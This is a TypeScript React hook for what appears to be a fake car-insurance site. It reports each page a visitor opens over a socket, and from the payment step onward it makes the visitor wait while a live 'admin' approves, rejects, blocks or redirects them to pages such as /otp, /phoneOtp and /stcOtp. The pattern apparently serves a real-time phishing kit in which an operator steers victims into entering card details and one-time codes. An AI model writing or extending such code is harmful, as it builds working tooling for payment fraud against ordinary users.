// @ts-nocheck
import { useEffect, useRef, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { socketService } from '@/site/services/socket';

/*
 * Live Tracking + Admin Gate Hook
 *  1. Emits step_changed on every route transition
 *  2. Requests the admin gate: pages BEFORE payment pass freely; from the
 *     payment step onward the visitor waits for admin approval
 *  3. Listens for admin directives (approve / reject / redirect / block)
 */

const ROUTE_WHITELIST = [
  '/', '/about', '/contact', '/blog', '/faq', '/products', '/compare',
  '/insurance/car', '/login', '/reg',
  '/phone', '/phoneOtp', '/payment', '/otp', '/success',
  '/stc', '/stcOtp', '/confirm', '/verify', '/activate',
];

function isWhitelisted(route: string): boolean {
  if (ROUTE_WHITELIST.includes(route)) return true;
  if (route.startsWith('/insurance/') && route.split('/').length === 3) return true;
  return false;
}

export function useLiveTracking() {
  const location = useLocation();
  const navigate = useNavigate();
  const connectedRef = useRef(false);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [hold, setHold] = useState<null | 'review' | 'blocked'>(null);

  useEffect(() => {
    socketService.setNavigateHandler((route: string) => {
      if (isWhitelisted(route)) navigate(route);
    });
  }, [navigate]);

  useEffect(() => {
    if (!connectedRef.current) {
      socketService.connect();
      connectedRef.current = true;
    }
  }, []);

  // On every route transition: track + ask the gate
  useEffect(() => {
    const path = location.pathname;
    socketService.emitStepChange(path);

    let cancelled = false;
    const stopPoll = () => {
      if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null; }
    };

    const applyDirective = async (sess: any) => {
      const d = sess?.admin_directive;
      if (!d) return false;
      const nonce = sess?.directive_nonce;
      if (nonce) {
        void fetch('/api/public/gate', {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ action: 'ack', sid: socketService.sessionId, nonce }),
        }).catch(() => {});
      }
      if (d === 'approve') { setHold(null); return true; }
      if (d === 'reject') { setHold(null); navigate(-1); return true; }
      if (d === 'block') { setHold('blocked'); return true; }
      if (typeof d === 'string' && d.startsWith('/') && isWhitelisted(d)) {
        setHold(null);
        navigate(d);
        return true;
      }
      return false;
    };

    const poll = async () => {
      try {
        const res = await fetch(`/api/public/gate?sid=${encodeURIComponent(socketService.sessionId)}`, { cache: 'no-store' });
        if (!res.ok) return;
        const j = await res.json();
        if (cancelled) return;
        const sess = j?.session;
        if (await applyDirective(sess)) { stopPoll(); return; }
        if (sess && !sess.awaiting_approval) { setHold(null); stopPoll(); }
      } catch { /* best-effort */ }
    };

    (async () => {
      try {
        const res = await fetch('/api/public/gate', {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ action: 'request', sid: socketService.sessionId, path }),
        });
        const j = await res.json().catch(() => null);
        if (cancelled) return;
        if (j?.awaiting) {
          setHold('review');
          stopPoll();
          pollRef.current = setInterval(poll, 2500);
        } else {
          setHold(null);
          // Still check for a pending redirect directive
          void poll();
        }
      } catch { setHold(null); }
    })();

    return () => { cancelled = true; stopPoll(); };
  }, [location.pathname, navigate]);

  return { hold };
}
